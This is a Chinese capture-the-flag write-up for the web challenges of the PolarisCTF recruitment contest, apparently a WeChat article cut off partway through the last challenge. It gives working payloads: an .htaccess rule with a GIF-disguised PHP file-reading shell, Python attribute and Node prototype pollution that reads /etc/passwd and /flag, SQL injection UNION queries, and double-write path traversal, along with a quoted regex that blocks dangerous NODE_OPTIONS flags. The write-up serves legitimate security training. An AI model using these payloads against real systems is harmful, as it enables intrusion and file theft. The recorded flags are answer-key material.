---
title: polarisctf招新赛-部分（WEB）
url: https://mp.weixin.qq.com/s/_E4IbKpZ8FvOsfQVg6V77A
source: Doonsec's feed
date: 2026-03-30
fetch_date: 2026-03-31T04:33:05.450341
---

# polarisctf招新赛-部分（WEB）

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/hiaeZ5goDm5dND6LlGM69PJyaAiacdGTQH5TpajAWOeMvszSjbGxteTc0bficnvZPicsTJoiaA0STqGE6Hu4ClOVhicZTdZGPHQsfHkH6icdVtoH1w/0?wx_fmt=jpeg)

# polarisctf招新赛-部分（WEB）

原创

玄网安全 oPis
玄网安全 oPis

玄网安全

![]()

在小说阅读器中沉浸阅读

WEB

![](https://mmbiz.qpic.cn/mmbiz_png/hiaeZ5goDm5f03aJpcTlHHA5gt0MvVyBxALhqXhvzvchv0VWgDymDQqbfsb1LhwhnBVFhichjj6NgicMCvF5jIeUxzau0C8zicTHibxbticWHE8P8/640?wx_fmt=png&from=appmsg)

Web - ez\_python Writeup

1. 题目背景

本题提供了一个基于 Flask 的 Web 应用，源码中包含一个自定义的 merge 函数，用于将用户提交的 JSON 数据合并到全局实例 instance 中。

2. 漏洞点分析 (Vulnerability Analysis)

核心漏洞位于 merge 函数的递归逻辑中。这是一种典型的 Python 对象属性污染 (Object Attribute Pollution)。

1危险函数：setattr(dst, k, v)。

1逻辑缺陷：函数在递归合并时，没有对 k（键名）进行任何过滤。在 Python 中，对象拥有大量以 \_\_ 开头的内置属性（如 class）。

1代码片段：

1Python

|  |
| --- |
| Plain Text                   elif hasattr(dst, k) and type(v) == dict:                       merge(v, getattr(dst, k)) # 递归进入子对象else:                       setattr(dst, k, v) # 直接修改属性值 |

3. 利用思路 (Exploitation Strategy)

应用定义了两个类：Config（存储文件名）和 Polaris（持有 Config 实例）。

1目标：修改 instance.config.filename 的值。

1触发点：/read 路由会直接 open() 并读取 instance.config.filename 所指向的文件。

1攻击路径：

1通过 POST / 发送特定的 JSON。

1merge 函数会识别到 instance 具有 config 属性。

1递归进入 config 对象。

1将 config.filename 修改为敏感文件路径（如 /etc/passwd 或 flag）。

4. 攻击 Payload

使用 curl 工具发送 Payload：

第一步：污染属性

Bash

|  |
| --- |
| Plain Text                   curl -X POST -H "Content-Type: application/json" \                        -d '{"config": {"filename": "/etc/passwd"}}' \                        http://:5000/ |

第二步：读取文件

Bash

|  |
| --- |
| Plain Text                   curl http://:5000/read |

Web - only real 简易题解

题目信息

1目标： http://80-7d824548-1a1f-4be7-9c16-a23ac7a1044c.challenge.ctfplus.cn/

1服务：Apache（Debian）

1现象：后台 dashboard.php 的表单控件被 disabled ，前端看起来无法上传；但直接访问 upload.php 返回“上传成功”，说明存在未鉴权/弱鉴权上传接口。

2. 初始侦察

访问首页，页面源码里直接泄露登录凭据：

1账号密码： xmuser/123456

访问后台页面：

1未带 cookie 访问 dashboard.php 显示“未登录”

1登录后会下发 token （JWT）到 Cookie，但本题核心利用点不依赖后台表单，而是绕过到独立上传接口。

3. 关键漏洞点

3.1 未受控上传接口

1直接访问 upload.php 显示“上传成功”

1使用 multipart/form-data POST 上传文件即可落盘

3.2 上传目录可访问

上传后文件可通过 Web 路径直接访问，实际落点是：

1http://.../uploads/

（例如上传 test.jpg 后访问 /uploads/test.jpg 返回 200）

3.3 类型限制可绕过（.htaccess + 图片马）

1直接上传 .php 会被判定为非法类型

1.jpg 可以上传但默认不解析

1Apache 支持目录级 .htaccess 覆盖 MIME/解析规则

1如果允许上传 .htaccess 到可访问目录，即可将 .jpg 当作 PHP 解析

利用配置：

|  |
| --- |
| Plain Text                   AddType application/x-httpd-php .jpg |

4. 利用过程（完整复现）

4.1 准备两个文件

1） .htaccess 内容（保存为 payload\_htaccess.txt ，上传时改名为 .htaccess ）：

|  |
| --- |
| Plain Text                   AddType application/x-httpd-php .jpg |

2）图片马（保存为 payload\_shell.jpg ，上传时命名为 test.jpg ）

 用 GIF89a 头伪装成图片文件，再拼接 PHP：

|  |
| --- |
| Plain Text                   GIF89a                   echo file\_get\_contents($\_GET['f'] ?? '/flag'); |

4.2 上传 .htaccess

|  |
| --- |
| Plain Text                   curl -i -F "file=@payload\_htaccess.txt;filename=.htaccess" \                     http://80-7d824548-1a1f-4be7-9c16-a23ac7a1044c.challenge.                     ctfplus.cn/upload.php |

返回： 上传成功

4.3 上传图片马 test.jpg

|  |
| --- |
| Plain Text                   curl -i -F "file=@payload\_shell.jpg;filename=test.jpg" \                     http://80-7d824548-1a1f-4be7-9c16-a23ac7a1044c.challenge.                     ctfplus.cn/upload.php |

返回： 上传成功

4.4 触发解析并读取 flag

访问：

|  |
| --- |
| Plain Text                   http://80-7d824548-1a1f-4be7-9c16-a23ac7a1044c.challenge.                   ctfplus.cn/uploads/test.jpg?f=/flag |

得到：

1xmctf{236026eb-20fa-476f-9713-25a254415bc8}

5. Flag

1xmctf{236026eb-20fa-476f-9713-25a254415bc8}

Web - ezpollute (100 pts)

5. 题目分析

1目标：通过配置管理器漏洞读取服务器根目录下的 /flag。

1环境：Node.js + Express，使用了 child\_process.spawn 执行系统命令。

1关键代码：

1/api/config 接口存在自定义的 merge 函数，用于合并用户配置。

1/api/status 接口会启动一个 node 子进程，并手动构建 customEnv 环境变量。

2. 漏洞点分析

(1) 原型链污染 (Prototype Pollution)

merge 函数虽然过滤了 proto，但未过滤 constructor。在 Node.js 中，可以通过 constructor.prototype 污染全局 Object.prototype。

(2) 环境变量注入绕过

在 /api/status 中，程序试图对 NODE\_OPTIONS 进行安全检查：

JavaScript

|  |
| --- |
| Plain Text                   const dangerousPattern = /(?:^|\s)--(require|import|loader|openssl|icu|inspect)\b/i; |

该正则仅拦截了以 -- 开头的长参数（如 --require），但 Node.js 同样支持 -r 作为简写。正则未能覆盖短参数，导致可以注入恶意加载项。

(3) 隔离失效

虽然 spawn 使用了 Object.create(null) 来创建 customEnv，试图隔绝原型链污染，但在某些 Node.js 版本或特定的 spawn 实现中，如果污染了全局 Object.prototype 的特定属性，仍可能影响子进程的初始环境加载。

3. 解题过程

1构造 Payload：利用 constructor.prototype 注入 NODE\_OPTIONS 环境变量，使用短选项 -r 加载 /flag。

1JSON

|  |
| --- |
| Plain Text                   {                       "constructor": {                           "prototype": {                               "NODE\_OPTIONS": "-r /flag"                           }                       }                   } |

1触发漏洞：

1首先 POST /api/config 提交 Payload，成功污染内存。

1随后 GET /api/status 触发子进程执行。

1获取 Flag： 由于 /flag 文件内容（XMCTF{...}）不符合 JavaScript 语法规范，Node.js 在预加载该文件时会抛出 SyntaxError。该报错信息通过 stderr 返回并回显在页面上。

4. 获取 Flag

Plaintext

|  |
| --- |
| Plain Text                   /flag:1                   XMCTF{2b4c5b1a-5a94-46b6-a789-bbb2fbe353ca}                         ^                   SyntaxError: Unexpected token '{' |

Web - Not a Node (100 pts)

5. 题目背景

题目提供了一个名为 BunEdge 的 Serverless 代码执行平台。根据题目描述和页面信息，该环境并非标准的 Node.js，而是运行在 JavaScriptCore (JSC) 引擎之上的定制沙箱环境。

2. 漏洞发现

(1) 信息泄露与环境探测

通过查看前端 HTML 源代码及 Documentation 部分，发现平台暴露了一个特殊的全局对象 \_\_runtime。

利用 Object.getOwnPropertyNames(\_\_runtime) 进行探测，发现其包含多个非标准属性：

1\_secrets: 模拟 CLI 存储，但权限被锁死。

1\_internal: 包含底层 C++ 绑定。

1\_internal.lib.symbols: 包含混淆过的函数名。

(2) 逆向函数名

在 \_\_runtime.\_internal.lib.symbols 中发现两个属性：

1\_0x72656164 $\rightarrow$ 十六进制解码为 read

1\_0x6c697374 $\rightarrow$ 十六进制解码为 list

(3) 路径处理缺陷

初步尝试调用 read("/flag") 时，系统报错：

|  |
| --- |
| Received "/app/\u0000\u0000..."  这表明底层的 C++ 绑定在处理 JavaScript 字符串时，会强制将其拼接在 /app/ 路径后，且可能存在内存对齐导致的空字节干扰。 |

3. 漏洞利用

报错信息提示该函数支持 Uint8Array 类型的参数。通过传入字节数组，可以绕过 JavaScript 层的字符串预处理逻辑，实现对绝对路径的访问。

Final Payload (index.ts):

JavaScript

|  |
| --- |
| Plain Text                   export default {                     async fetch(req) {                       const symbols = \_\_runtime.\_internal.lib.symbols;                       const readFn = symbols.\_0x72656164; // read// 使用 Uint8Array 绕过字符串拼接逻辑const path = new TextEncoder().encode("/flag");                       const flag = readFn(path);                        return new Response(flag);                     }                   } |

4. 获取 Flag

部署上述代码后，成功触发底层 read 绑定读取根目录文件。

Flag: XMCTF{2aa025ff-515b-4828-aba0-b9d4f4e3be85}

Web -Broken Trust

0x01 挑战概述

1挑战名称: Broken Trust

1核心漏洞: SQL Injection (SQLi)、IDOR (越权访问)、Path Traversal (路径穿越)

1目标: 绕过身份校验，利用管理员权限读取根目录下的 flag 文件。

0x02 漏洞挖掘流程

1. 初始探测与身份绕过

1注册逻辑缺陷：尝试注册 admin 提示已存在，但通过大小写绕过成功注册 admIN 账号并登录。

1参数敏感性确认：观察 refreshProfile 接口发现其通过 POST 提交 uid 字符串来同步用户信息。在 uid 后添加单引号 ' 触发 500 错误，确认后端存在 SQL 注入。

2. SQL 注入与权限提升

由于后端直接信任前端传入的 uid 且未进行参数化查询，我们可以通过注入获取真实管理员身份。

1探测数据库结构 (SQLite)： Payload: uid: "-1' UNION SELECT 1, group\_concat(tbl\_name), 3 FROM sqlite\_master WHERE type='table'--" 得到关键表名：users。

1提取管理员 UID： Payload: uid: "-1' UNION SELECT uid, username, role FROM users WHERE role='admin'--" 成功获取真实 Admin 的 UID：53319863dd54488ba4cc7e596c583f59。

3. 备份接口分析

登录管理员账号后，解锁 Administrator Tools，其核心接口为： /api/admin?action=backup&file=config.json

1防御机制测试：

1绝对路径拦截：输入 /flag 触发过滤，返回 Direct absolute path access is forbidden!。

1相对路径失效：输入 ../../flag 返回 404 File not found，推测后端对 ../ 进行了空字符串替换过滤。

0x03 漏洞利用 (Exploitation)

1. 双写绕过 (Double-Write) 逻辑

后端过滤逻辑可能为 file.replace("../", "")。为了绕过此限制，采用双写构造。当中间的 ../ 被剔除后，首尾字符将重新组合成有效的路径穿越符。

2. 最终 Payload 构造

在浏览器 Console 执行复合攻击脚本，同时携带 真实 Admin UID 和 双写路径穿越符：

Payload (GET):fetch('/api/admin?action=backup&file=....//....//....//....//flag&uid=53319863dd54488ba4cc7e596c583f59')

3. 获取结果

成功绕过 WAF 和路径过滤，服务器返回根目录文件内容： XMCTF{5de4d6b3-47c4-44db-972a-2e363e3091fe}

WEB- Workflow Service

0x01 挑战分析

1挑战名称: Workflow Service

1核心漏洞: SQL 逻辑注入 (COALES...